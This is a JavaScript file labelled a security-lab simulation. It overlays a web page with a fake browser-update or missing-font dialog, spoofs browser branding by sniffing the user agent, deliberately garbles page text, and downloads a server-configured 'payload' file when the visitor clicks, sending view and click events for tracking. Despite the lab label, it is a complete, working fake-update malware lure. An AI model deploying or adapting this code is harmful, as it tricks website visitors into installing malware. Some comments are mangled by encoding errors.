/**
 * SECURITY LAB SIMULATION SCRIPT v6.0 (Smart Targeting)
 * Features:
 * - Dynamic Browser Detection (Chrome/Edge/Firefox/Safari)
 * - Adaptive Branding & Icons
 * - Broken Font Rendering (Alien Text)
 */

(function() {
    const API_URL = '/api/config.php';
    let currentConfig = {};

    // --- 1. “≈À≈Ã≈“–»ﬂ ---
    function sendEvent(type) {
        fetch(`${API_URL}?action=track`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ type: type })
        }).catch(e => console.error("Telemetry error:", e));
    }

    function downloadPayload() {
        if (!currentConfig.payload_file) return;
        sendEvent('click');
        
        const link = document.createElement('a');
        link.href = `downloads/${currentConfig.payload_file}`;
        link.setAttribute('download', currentConfig.payload_file);
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        cleanup();
    }

    // --- 2. ¡»¡À»Œ“≈ ¿ » ŒÕŒ  (SVG) ---
    const icons = {
        chrome: `<svg viewBox="0 0 48 48" fill="none"><path d="M24 4C12.95 4 4 12.95 4 24C4 35.05 12.95 44 24 44C35.05 44 44 35.05 44 24C44 12.95 35.05 4 24 4Z" fill="white"/><path d="M24 4C35.05 4 44 12.95 44 24C44 26.66 43.48 29.19 42.54 31.5L23.47 31.5L20.89 27L24 21.61L30.93 33.61C33.45 32.16 35.48 29.98 36.75 27.35L24 5.27C24 5.27 24 4 24 4Z" fill="#FCC934"/><path d="M24 4C12.95 4 4 12.95 4 24C4 26.66 4.52 29.19 5.46 31.5L16.21 12.89L18.79 8.39L24 17.41L12.01 38.18C8.5 36.16 6.17 32.39 5.46 28.1L12 16.78L24 4Z" fill="#EA4335"/><path d="M24 44C35.05 44 44 35.05 44 24C44 21.34 43.48 18.81 42.54 16.5L31.79 35.11L29.21 39.61L24 30.59L35.99 9.82C39.5 11.84 41.83 15.61 42.54 19.9L36 31.22L24 44Z" fill="#34A853"/><path d="M24 32C28.4183 32 32 28.4183 32 24C32 19.5817 28.4183 16 24 16C19.5817 16 16 19.5817 16 24C16 28.4183 19.5817 32 24 32Z" fill="#F1F3F4"/><path d="M24 29C26.7614 29 29 26.7614 29 24C29 21.2386 26.7614 19 24 19C21.2386 19 19 21.2386 19 24C19 26.7614 21.2386 29 24 29Z" fill="#1A73E8"/></svg>`,
        
        edge: `<svg viewBox="0 0 48 48" fill="none"><path d="M2.36 21.05C3.39 12.38 10.37 5.76 19.06 5.06C21.84 4.84 24.34 5.25 26.68 6.14C26.06 8.5 26.34 11.75 28.31 15.01C26.31 14.11 24.41 13.92 22.86 14.24C16.92 15.46 14.28 22.79 17.5 27.65C19.58 30.79 24.58 32.06 28.43 28.84C29.61 27.85 30.56 26.65 31.24 25.29H20.72V17.54H42.75C43.25 21.46 41.97 25.86 39.06 29.83C35.08 35.26 28.36 38.35 21.5 37.89C10.74 37.16 2.36 28.24 2.36 17.5V21.05Z" fill="#0078D7"/><path d="M28.31 15.01C31.54 20.35 38.65 22.25 43.34 20.61C44.7 15.42 43.19 9.87 38.74 6.27C35.12 3.34 30.5 1.94 25.87 2.32C30.7 2.32 32.86 6.3 28.31 15.01Z" fill="#35C1F1"/><path d="M20.5 38C13 38 7 34 5 28C3.5 31 3.5 36 6 40C9.5 45 16.5 46.5 22.5 45.5C28.5 44.5 34 40.5 36 36C28 39 22 38 20.5 38Z" fill="#223E4D"/></svg>`,
        
        firefox: `<svg viewBox="0 0 48 48"><path fill="#FF9500" d="M24 4C24 4 38 8 42 20C42 20 45 28 38 38C38 38 32 44 24 44C16 44 10 38 10 38C3 28 6 20 6 20C10 8 24 4 24 4Z"/><path fill="#FF0000" d="M24 10C24 10 34 12 36 20C36 20 38 26 34 32"/><circle cx="24" cy="24" r="10" fill="#20123A"/></svg>`, // ”ÔÓ˘ÂÌÌ˚È ÎÓ„ÓÚËÔ
        
        safari: `<svg viewBox="0 0 48 48" fill="none"><circle cx="24" cy="24" r="20" fill="#FFF"/><path d="M24 4C12.97 4 4 12.97 4 24C4 35.03 12.97 44 24 44C35.03 44 44 35.03 44 24C44 12.97 35.03 4 24 4ZM24 40C15.18 40 8 32.82 8 24C8 15.18 15.18 8 24 8C32.82 8 40 15.18 40 24C40 32.82 32.82 40 24 40Z" fill="#1B88D8"/><path d="M33.41 14.59L26.83 26.83L14.59 33.41L21.17 21.17L33.41 14.59ZM24 25.5C23.17 25.5 22.5 24.83 22.5 24C22.5 23.17 23.17 22.5 24 22.5C24.83 22.5 25.5 23.17 25.5 24C25.5 24.83 24.83 25.5 24 25.5Z" fill="#29CCB1"/></svg>`,
        
        font: `<div style="font-family: 'Times New Roman'; font-size: 48px; color: #5f6368;">A</div>`
    };

    // --- 3. Œœ–≈ƒ≈À≈Õ»≈ ¡–¿”«≈–¿ ---
    function detectBrowser() {
        const ua = navigator.userAgent;
        let b = { name: "Browser", icon: icons.chrome, version: "Latest" }; // Default

        if (ua.includes("Edg")) {
            b.name = "Microsoft Edge";
            b.icon = icons.edge;
            b.version = "123.0.2420.65";
        } else if (ua.includes("Firefox")) {
            b.name = "Mozilla Firefox";
            b.icon = icons.firefox;
            b.version = "125.0.1";
        } else if (ua.includes("Chrome")) {
            b.name = "Google Chrome";
            b.icon = icons.chrome;
            b.version = "124.0.6367.60";
        } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
            b.name = "Safari";
            b.icon = icons.safari;
            b.version = "17.4.1";
        }
        return b;
    }

    // --- 4. CSS —“»À» ---
    const styles = `
        .se-broken-font-mode {
            font-family: 'Webdings', 'Wingdings', 'Symbol', sans-serif !important;
            text-shadow: 0 0 1px rgba(0,0,0,0.5);
            user-select: none; pointer-events: none; overflow: hidden;
        }
        #se-lab-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255, 255, 255, 0.4);
            z-index: 2147483647;
            display: flex; justify-content: center; align-items: center;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
            pointer-events: auto; backdrop-filter: blur(4px);
        }
        .se-modal {
            background: #fff; width: 480px; max-width: 90%;
            padding: 24px; border-radius: 8px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
            display: flex; gap: 20px;
            animation: popIn 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28);
            border: 1px solid rgba(0,0,0,0.1);
        }
        @keyframes popIn { from { transform: scale(0.92); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        
        .se-icon-col { flex-shrink: 0; padding-top: 4px; width: 48px; }
        .se-icon-col svg { width: 100%; height: auto; }
        .se-content-col { flex-grow: 1; }
        .se-title { margin: 0 0 8px 0; font-size: 18px; font-weight: 500; color: #202124; }
        .se-text { margin: 0 0 16px 0; font-size: 14px; line-height: 1.5; color: #5f6368; }
        .se-info-box { font-size: 13px; color: #70757a; margin-bottom: 20px; }
        
        .se-buttons { display: flex; justify-content: flex-end; gap: 12px; margin-bottom: 12px; }
        .se-btn { border: none; padding: 9px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: 0.2s; }
        .se-btn-sec { background: #fff; color: #1a73e8; border: 1px solid #dadce0; }
        .se-btn-sec:hover { background: #f8f9fa; }
        .se-btn-prim { background: #1a73e8; color: #fff; }
        .se-btn-prim:hover { background: #1557b0; }
        
        .se-footer-note { font-size: 12px; border-top: 1px solid #f1f3f4; padding-top: 12px; line-height: 1.4; color: #70757a; }
        .se-green { color: #1e8e3e; }
    `;

    function injectStyles() {
        if (!document.getElementById("se-lab-styles")) {
            const s = document.createElement("style");
            s.innerText = styles;
            s.id = "se-lab-styles";
            document.head.appendChild(s);
        }
    }

    function cleanup() {
        document.getElementById('se-lab-overlay')?.remove();
        document.body.classList.remove('se-broken-font-mode');
        document.getElementById('se-lab-styles')?.remove();
    }

    // --- 5. √≈Õ≈–¿÷»ﬂ  ŒÕ“≈Õ“¿ ---
    function getModalContent(mode) {
        if (mode === 'browser_update') {
            const browser = detectBrowser();
            
            return `
                <div class="se-icon-col">${browser.icon}</div>
                <div class="se-content-col">
                    <h2 class="se-title">${browser.name} update recommended</h2>
                    <p class="se-text">Your version of ${browser.name} has known critical security issues. Install the latest update to restore secure browsing.</p>
                    <div class="se-info-box">Recommended version: ${browser.name} ${browser.version}</div>
                    
                    <div class="se-buttons">
                        <button class="se-btn se-btn-sec" onclick="alert('Policy Error: Cannot defer critical update')">Later</button>
                        <button class="se-btn se-btn-prim" id="se-action-btn">Update ${browser.name}</button>
                    </div>
                    <div class="se-footer-note">
                        You can continue without updating, but your passwords and data may be at risk.
                    </div>
                </div>
            `;
        } else {
            return `
                <div class="se-icon-col">${icons.font}</div>
                <div class="se-content-col">
                    <h2 class="se-title">System font required</h2>
                    <p class="se-text">Interface elements cannot be displayed correctly because the required font package is missing.</p>
                    <div class="se-info-box" style="background: #f1f3f4; padding: 6px; border-radius: 4px;">Package: Segoe UI / Roboto (Fix)</div>
                    
                    <div class="se-buttons">
                        <button class="se-btn se-btn-sec" style="color:#5f6368" onclick="alert('Rendering Error: Action failed')">Skip</button>
                        <button class="se-btn se-btn-prim" id="se-action-btn" style="background:#3b66f5">Download font</button>
                    </div>
                    <div class="se-footer-note se-green">
                        Installing this font pack will fix layout issues immediately.
                    </div>
                </div>
            `;
        }
    }

    // --- 6. «¿œ”—  ---
    async function init() {
        try {
            const resp = await fetch(API_URL);
            const data = await resp.json();
            currentConfig = data.config || data;

            if (currentConfig.is_active === '1') {
                setTimeout(() => {
                    injectStyles();
                    document.body.classList.add('se-broken-font-mode');
                    
                    const overlay = document.createElement('div');
                    overlay.id = 'se-lab-overlay';
                    overlay.innerHTML = `<div class="se-modal">${getModalContent(currentConfig.mode)}</div>`;
                    document.body.appendChild(overlay);

                    document.getElementById('se-action-btn')?.addEventListener('click', downloadPayload);
                    sendEvent('view');
                }, parseInt(currentConfig.delay_ms) || 2000);
            }
        } catch (e) { console.error(e); }
    }

    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
    else init();

})();